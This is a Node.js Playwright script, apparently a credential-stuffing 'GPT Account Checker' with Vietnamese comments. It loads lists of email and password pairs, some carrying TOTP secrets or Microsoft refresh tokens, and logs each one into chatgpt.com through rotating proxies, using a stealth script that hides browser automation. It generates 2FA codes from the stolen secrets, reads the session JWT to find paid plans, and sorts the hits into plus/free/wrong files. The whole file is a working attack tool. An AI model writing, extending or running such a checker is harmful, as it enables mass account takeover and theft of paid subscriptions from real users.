'use strict';

const { chromium } = require('playwright');
const chalk        = require('chalk');
const figlet       = require('figlet');
const readline     = require('readline');
const fs           = require('fs');
const path         = require('path');
const crypto       = require('crypto');

// ── TOTP ──────────────────────────────────────────────────────────────────────

function base32Decode(s) {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567';
  const str = s.toUpperCase().replace(/=+$/, '').replace(/\s/g, '');
  let bits = 0, val = 0;
  const out = [];
  for (const c of str) {
    const i = chars.indexOf(c);
    if (i < 0) continue;
    val = (val << 5) | i;
    bits += 5;
    if (bits >= 8) { out.push((val >>> (bits - 8)) & 0xff); bits -= 8; }
  }
  return Buffer.from(out);
}

function generateTOTP(secret) {
  const key  = base32Decode(secret);
  const step = Math.floor(Date.now() / 30000);
  const msg  = Buffer.alloc(8);
  msg.writeBigUInt64BE(BigInt(step));
  const hmac = crypto.createHmac('sha1', key).update(msg).digest();
  const off  = hmac[19] & 0xf;
  const code = ((hmac[off] & 0x7f) << 24 | hmac[off+1] << 16 | hmac[off+2] << 8 | hmac[off+3]) % 1000000;
  return String(code).padStart(6, '0');
}

// ── Account field detection ───────────────────────────────────────────────────

// field3 có thể là: TOTP secret (base32 ngắn) hoặc Microsoft refresh token (dài, M.C...)
function detectExtra(field) {
  if (!field) return null;
  // TOTP secret: chỉ A-Z và 2-7, độ dài 16-64 ký tự
  if (/^[A-Z2-7]{16,64}$/.test(field.toUpperCase())) return { type: 'totp', value: field };
  // Microsoft refresh token: bắt đầu M. hoặc dài > 100 ký tự
  if (field.startsWith('M.') || field.length > 100) return { type: 'ms_token', value: field };
  return { type: 'unknown', value: field };
}

// ── Constants ─────────────────────────────────────────────────────────────────

const PLUS       = 'PLUS';
const FREE       = 'FREE';
const WRONG_PASS = 'WRONG_PASS';
const DIE        = 'DIE';
const TIMEOUT    = 'TIMEOUT';

const BROWSER_ARGS = [
  '--disable-blink-features=AutomationControlled',
  '--no-sandbox', '--disable-dev-shm-usage', '--disable-gpu',
  '--disable-infobars', '--disable-extensions',
];

const STEALTH_SCRIPT = `(() => {
  Object.defineProperty(navigator, 'webdriver',          { get: () => undefined });
  Object.defineProperty(navigator, 'plugins',            { get: () => [1,2,3,4,5] });
  Object.defineProperty(navigator, 'languages',          { get: () => ['en-US','en'] });
  Object.defineProperty(navigator, 'platform',           { get: () => 'Win32' });
  Object.defineProperty(navigator, 'vendor',             { get: () => 'Google Inc.' });
  Object.defineProperty(navigator, 'hardwareConcurrency',{ get: () => 8 });
  if (!window.chrome) window.chrome = {};
  if (!window.chrome.runtime) window.chrome.runtime = {};
})();`;

const BLOCKED_TYPES = new Set(['font', 'media']);

// ── Shared state ──────────────────────────────────────────────────────────────

const deadProxies = new Set();

// ── Helpers ───────────────────────────────────────────────────────────────────

const sleep = ms => new Promise(r => setTimeout(r, ms));

function decodeJWT(token) {
  try {
    const parts = token.split('.');
    if (parts.length !== 3) return null;
    const b64 = parts[1].replace(/-/g, '+').replace(/_/g, '/') + '=='.slice(0, (4 - parts[1].length % 4) % 4);
    return JSON.parse(Buffer.from(b64, 'base64').toString('utf-8'));
  } catch { return null; }
}

function extractPlanFromPayload(payload) {
  if (!payload) return null;
  const str = JSON.stringify(payload).toLowerCase();
  // OpenAI-specific profile key
  const profile = payload['https://api.openai.com/profile'];
  if (profile) {
    const ps = JSON.stringify(profile).toLowerCase();
    if (ps.includes('pro'))        return 'Pro';
    if (ps.includes('plus'))       return 'Plus';
    if (ps.includes('team'))       return 'Team';
    if (ps.includes('enterprise')) return 'Enterprise';
    if (ps.includes('free'))       return 'Free';
  }
  if (str.includes('"pro"') || str.includes('chatgpt_pro'))   return 'Pro';
  if (str.includes('"plus"') || str.includes('chatgpt_plus')) return 'Plus';
  if (str.includes('"team"'))       return 'Team';
  if (str.includes('"enterprise"')) return 'Enterprise';
  if (str.includes('"free"'))       return 'Free';
  return null;
}

// ── File I/O ──────────────────────────────────────────────────────────────────

function loadProxies(filepath) {
  const proxies = [];
  for (let line of fs.readFileSync(filepath, 'utf-8').split('\n')) {
    line = line.trim();
    if (!line || line.startsWith('#')) continue;
    if (/^https?:\/\/|^socks5:\/\//.test(line)) { proxies.push({ server: line }); continue; }
    const parts = line.split(':');
    if (parts.length === 2) proxies.push({ server: `socks5://${parts[0]}:${parts[1]}` });
    else if (parts.length === 4) proxies.push({ server: `http://${parts[0]}:${parts[1]}`, username: parts[2], password: parts[3] });
  }
  return proxies;
}

function loadAccounts(filepath) {
  if (!fs.existsSync(filepath)) return [];
  const accounts = [];
  const ext  = path.extname(filepath).toLowerCase();
  const text = fs.readFileSync(filepath, 'utf-8');
  if (ext === '.json') {
    const data = JSON.parse(text);
    const entries = Array.isArray(data) ? data.map(i => [i.email, i.password]) : Object.entries(data);
    accounts.push(...entries);
  } else {
    for (let rawLine of text.split('\n')) {
      const line = rawLine.trim();
      if (!line || line.startsWith('#')) continue;
      const sep   = line.includes('|') ? '|' : ':';
      const parts = line.split(sep).map(p => p.trim());
      if (parts.length < 2) continue;
      const email    = parts[0];
      const password = parts[1];
      const extra    = parts.length >= 3 ? detectExtra(parts[2]) : null;
      const deviceId = parts.length >= 4 ? parts[3] : null;
      accounts.push([email, password, extra, deviceId, line]);
    }
  }
  return accounts;
}

function exportResults(results) {
  const buckets = {
    'plus.txt':    results.filter(r => r && r.status === PLUS),
    'free.txt':    results.filter(r => r && r.status === FREE),
    'wrong.txt':   results.filter(r => r && r.status === WRONG_PASS),
    'die.txt':     results.filter(r => r && r.status === DIE),
    'timeout.txt': results.filter(r => r && r.status === TIMEOUT),
  };
  const saved = [];
  for (const [filename, rows] of Object.entries(buckets)) {
    if (!rows.length) continue;
    fs.writeFileSync(filename, rows.map(r => r.rawLine || `${r.email}|${r.password}`).map(l => l + '\n').join(''), { flag: 'a', encoding: 'utf-8' });
    saved.push([filename, rows.length]);
  }
  if (saved.length) {
    console.log('');
    console.log('  ' + chalk.bold('📁 Exported:'));
    for (const [fname, count] of saved)
      console.log(`    ${chalk.cyan(fname)}  ${chalk.dim(`(${count} accounts)`)}`);
  }
}

// ── UI ────────────────────────────────────────────────────────────────────────

function printBanner() {
  const art = figlet.textSync('STEWIE', { font: 'Slant' });
  console.log(chalk.bold.cyan(art));
  const bar = chalk.cyan('─'.repeat(58));
  console.log(bar);
  console.log(chalk.bold.white('  GPT Account Checker') + '  •  ' + chalk.dim('ChatGPT Plus / Pro / Free'));
  console.log(bar + '\n');
}

function printResult(r) {
  const acct = r.email.split('@')[0];
  const plan = r.plan ? chalk.bold.cyan(` | ${r.plan}`) : '';
  const tag  = r.extraType === 'totp' ? chalk.dim(' [2FA]') : r.extraType === 'ms_token' ? chalk.dim(' [MSA]') : '';
  if      (r.status === PLUS)       console.log(chalk.bold.green('✅') + ' ' + chalk.white(acct) + plan + tag);
  else if (r.status === FREE)       console.log(chalk.bold.blue('🆓') + ' ' + chalk.white(acct) + plan + tag);
  else if (r.status === WRONG_PASS) console.log(chalk.bold.yellow('🔑') + ' ' + chalk.dim(acct) + tag);
  else if (r.status === TIMEOUT)    console.log(chalk.bold.magenta('⏱') + ' ' + chalk.dim(acct) + tag);
  else                              console.log(chalk.bold.red('❌') + ' ' + chalk.dim(acct) + tag);
}

function printStats(results) {
  const plus    = results.filter(r => r && r.status === PLUS).length;
  const free    = results.filter(r => r && r.status === FREE).length;
  const wrong   = results.filter(r => r && r.status === WRONG_PASS).length;
  const dead    = results.filter(r => r && r.status === DIE).length;
  const timeout = results.filter(r => r && r.status === TIMEOUT).length;
  const bar = '─'.repeat(52);
  console.log(bar);
  console.log(`  ${chalk.white('Total    :')} ${chalk.bold(results.length)}`);
  console.log(`  ${chalk.green('✅ PLUS   :')} ${chalk.bold.green(plus)}`);
  console.log(`  ${chalk.blue('🆓 FREE   :')} ${chalk.bold.blue(free)}`);
  console.log(`  ${chalk.yellow('🔑 WRONG  :')} ${chalk.bold.yellow(wrong)}`);
  console.log(`  ${chalk.red('❌ DIE    :')} ${chalk.bold.red(dead)}`);
  console.log(`  ${chalk.magenta('⏱ TIMEOUT:')} ${chalk.bold.magenta(timeout)}`);
  console.log(bar);
}

// ── Playwright core ───────────────────────────────────────────────────────────

async function makeContext(browser, proxy = null) {
  const opts = {
    userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
    viewport: { width: 1280, height: 800 },
  };
  if (proxy && !deadProxies.has(proxy.server)) opts.proxy = proxy;
  const ctx = await browser.newContext(opts);
  await ctx.addInitScript(STEALTH_SCRIPT);
  return ctx;
}

async function getError(page) {
  for (const sel of [
    "[data-testid='error-message-input']",
    "p[class*='ulp-input-error']",
    "[class*='error-message']",
    "[id*='error']",
  ]) {
    try {
      const el = page.locator(sel).first();
      if (await el.isVisible({ timeout: 500 })) {
        const txt = (await el.innerText()).trim();
        if (txt) return txt;
      }
    } catch {}
  }
  return null;
}

async function doLogin(page, email, password, extra = null) {
  try { await page.waitForLoadState('domcontentloaded', { timeout: 15000 }); } catch {}
  await sleep(800);

  // Click "Log in" nếu có
  try {
    const btn = page.getByRole('button', { name: 'Log in', exact: false }).first();
    if (await btn.isVisible({ timeout: 3000 })) { await btn.click(); await sleep(1500); }
  } catch {}

  // Chờ email input
  try { await page.waitForSelector("input[name='username'], input[type='email']", { timeout: 15000 }); }
  catch { return [DIE, 'No login form']; }

  const emailInput = page.locator("input[name='username'], input[type='email']").first();
  await emailInput.fill('');
  await emailInput.type(email, { delay: 40 });
  await sleep(300);

  try { await page.getByRole('button', { name: 'Continue', exact: false }).first().click(); }
  catch { return [DIE, 'No Continue button']; }
  await sleep(2000);

  const emailErr = await getError(page);
  if (emailErr) {
    const t = emailErr.toLowerCase();
    if (["doesn't exist", 'no account', 'not found', 'not registered'].some(k => t.includes(k)))
      return [DIE, emailErr];
    return [DIE, emailErr];
  }

  // Chờ password input
  try { await page.waitForSelector("input[type='password']", { timeout: 10000 }); }
  catch { return [DIE, 'No password field']; }

  const pwdInput = page.locator("input[type='password']").first();
  await pwdInput.fill('');
  await pwdInput.type(password, { delay: 40 });
  await sleep(300);

  try { await page.getByRole('button', { name: 'Continue', exact: false }).first().click(); }
  catch { return [DIE, 'No Continue button (pwd)']; }
  await sleep(2500);

  const pwdErr = await getError(page);
  if (pwdErr) {
    const t = pwdErr.toLowerCase();
    if (['wrong password', 'incorrect', 'invalid'].some(k => t.includes(k)))
      return [WRONG_PASS, pwdErr];
    return [DIE, pwdErr];
  }

  // Tự xử lý 2FA nếu có TOTP secret
  if (extra?.type === 'totp') {
    const tfaSel = "input[name='code'], input[autocomplete='one-time-code'], input[type='tel'][maxlength='6']";
    try {
      await page.waitForSelector(tfaSel, { timeout: 6000 });
      const otp = generateTOTP(extra.value);
      await page.fill(tfaSel, otp);
      await sleep(300);
      try { await page.getByRole('button', { name: /continue|verify|submit/i }).first().click(); } catch {}
      await sleep(2500);
    } catch {} // Không có 2FA = tốt
  }

  return [PLUS, null];
}

async function getPlan(page, interceptedPlan) {
  if (interceptedPlan) return interceptedPlan;

  // Gọi /api/auth/session từ browser context
  try {
    const raw = await page.evaluate(async () => {
      try {
        const r = await fetch('/api/auth/session');
        return await r.text();
      } catch { return null; }
    });
    if (raw) {
      const data = JSON.parse(raw);
      const token = data?.accessToken || data?.access_token || '';
      if (token) {
        const plan = extractPlanFromPayload(decodeJWT(token));
        if (plan) return plan;
      }
      // Plan field trực tiếp trong response
      const str = JSON.stringify(data).toLowerCase();
      if (str.includes('"pro"'))    return 'Pro';
      if (str.includes('"plus"'))   return 'Plus';
      if (str.includes('"team"'))   return 'Team';
      if (str.includes('"free"'))   return 'Free';
    }
  } catch {}

  // Fallback: scan body
  await sleep(1500);
  try {
    const body = (await page.locator('body').innerText()).toLowerCase();
    if (body.includes('chatgpt pro') || body.includes('pro plan'))   return 'Pro';
    if (body.includes('chatgpt plus') || body.includes('plus plan')) return 'Plus';
    if (body.includes('free plan') || (body.includes('upgrade') && !body.includes('plus'))) return 'Free';
  } catch {}

  return 'Unknown';
}

// ── Check logic ───────────────────────────────────────────────────────────────

async function runCheck(browser, email, password, proxy = null, extra = null) {
  const ctx  = await makeContext(browser, proxy && !deadProxies.has(proxy.server) ? proxy : null);
  const page = await ctx.newPage();

  // Intercept /api/auth/session để bắt plan từ JWT
  let interceptedPlan = null;
  page.on('response', async (res) => {
    try {
      const url = res.url();
      if (!url.includes('/api/auth/session') && !url.includes('/backend-api/me')) return;
      const data = await res.json().catch(() => null);
      if (!data) return;
      const token = data?.accessToken || data?.access_token || '';
      if (token) {
        const plan = extractPlanFromPayload(decodeJWT(token));
        if (plan) { interceptedPlan = plan; return; }
      }
      const str = JSON.stringify(data).toLowerCase();
      if (str.includes('"pro"'))    interceptedPlan = 'Pro';
      else if (str.includes('"plus"'))   interceptedPlan = 'Plus';
      else if (str.includes('"team"'))   interceptedPlan = 'Team';
      else if (str.includes('"free"'))   interceptedPlan = 'Free';
    } catch {}
  });

  await page.route('**/*', route =>
    BLOCKED_TYPES.has(route.request().resourceType()) ? route.abort() : route.continue()
  );

  try {
    try {
      await page.goto('https://chatgpt.com/', { waitUntil: 'domcontentloaded', timeout: 30000 });
    } catch (e) {
      if (e.message.toLowerCase().includes('timeout'))
        return { email, password, status: TIMEOUT, plan: null, detail: 'Navigation timeout' };
      throw e;
    }

    const [loginStatus, loginErr] = await doLogin(page, email, password, extra);
    if (loginStatus !== PLUS) return { email, password, status: loginStatus, plan: null, detail: loginErr };

    // Chờ redirect về trang chính
    const deadline = Date.now() + 30000;
    while (Date.now() < deadline) {
      await sleep(600);
      const url = page.url();
      if (url.includes('chatgpt.com') && !url.includes('/auth') && !url.includes('/login')) break;
    }

    await sleep(1000);
    const plan      = await getPlan(page, interceptedPlan);
    const status    = ['Plus', 'Pro', 'Team', 'Enterprise'].includes(plan) ? PLUS : FREE;
    const extraType = extra?.type ?? null;

    return { email, password, status, plan, detail: null, extraType };
  } finally {
    await ctx.close();
  }
}

async function checkAccount(browser, email, password, proxy = null, extra = null) {
  if (proxy && deadProxies.has(proxy.server)) proxy = null;
  try {
    return await runCheck(browser, email, password, proxy, extra);
  } catch (e) {
    const proxyErrors = ['ERR_CONNECTION_CLOSED','ERR_TUNNEL_CONNECTION_FAILED','ERR_PROXY',
                         'ERR_EMPTY_RESPONSE','Connection refused','net::','Timeout','timeout'];
    if (proxy && proxyErrors.some(k => e.message.includes(k))) {
      deadProxies.add(proxy.server);
      try { return await runCheck(browser, email, password, null, extra); }
      catch (e2) { return { email, password, status: DIE, plan: null, detail: e2.message }; }
    }
    return { email, password, status: DIE, plan: null, detail: e.message };
  }
}

// ── Worker pool ───────────────────────────────────────────────────────────────

async function runAsync(accounts, proxies, workers) {
  const total   = accounts.length;
  const results = new Array(total).fill(null);
  let   qHead   = 0;

  const browsers = await Promise.all(
    Array.from({ length: workers }, () => chromium.launch({ headless: true, args: BROWSER_ARGS }))
  );

  async function worker(browser) {
    while (true) {
      const i = qHead++;
      if (i >= total) break;
      const [email, password, extra, deviceId, rawLine] = accounts[i];
      const proxy = proxies.length ? proxies[i % proxies.length] : null;
      try {
        const r = await checkAccount(browser, email, password, proxy, extra);
        r.rawLine = rawLine;
        results[i] = r;
        printResult(r);
      } catch (e) {
        results[i] = { email, password, status: DIE, plan: null, detail: e.message };
        printResult(results[i]);
      }
    }
  }

  await Promise.all(browsers.map(b => worker(b)));
  for (const b of browsers) await b.close();
  return results;
}

// ── Entry point ───────────────────────────────────────────────────────────────

function prompt(question) {
  const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
  return new Promise(resolve => rl.question(question, ans => { rl.close(); resolve(ans.trim()); }));
}

async function main() {
  printBanner();

  let filepath = process.argv[2];
  if (!filepath) {
    for (const def of ['accounts.txt', 'accounts.json']) {
      if (fs.existsSync(def)) { filepath = def; break; }
    }
  }
  if (!filepath || !fs.existsSync(filepath)) {
    console.log(chalk.red('Usage: node check_gpt.js <accounts.txt>'));
    process.exit(1);
  }

  let proxies = [];
  for (const pf of ['proxies.txt', 'proxy.txt']) {
    if (fs.existsSync(pf)) {
      proxies = loadProxies(pf);
      console.log(chalk.dim(`Proxy  : ${chalk.cyan(proxies.length)} from ${pf}`));
      break;
    }
  }

  const accounts = loadAccounts(filepath);
  if (!accounts.length) { console.log(chalk.red('No accounts found.')); process.exit(1); }
  console.log(chalk.dim(`Account: ${chalk.cyan(accounts.length)} from ${filepath}\n`));

  const wInput  = await prompt(chalk.bold.cyan('  Threads (Enter = 3): '));
  const workers = (wInput && /^\d+$/.test(wInput) && +wInput > 0) ? +wInput : 3;
  console.log(chalk.dim(`Workers: ${chalk.cyan(workers)}\n`));

  deadProxies.clear();
  const results = await runAsync(accounts, proxies, workers);
  printStats(results);
  exportResults(results);
}

module.exports = { checkAccount };

if (require.main === module) {
  main().catch(err => { console.error(chalk.red('Fatal error:'), err); process.exit(1); });
}
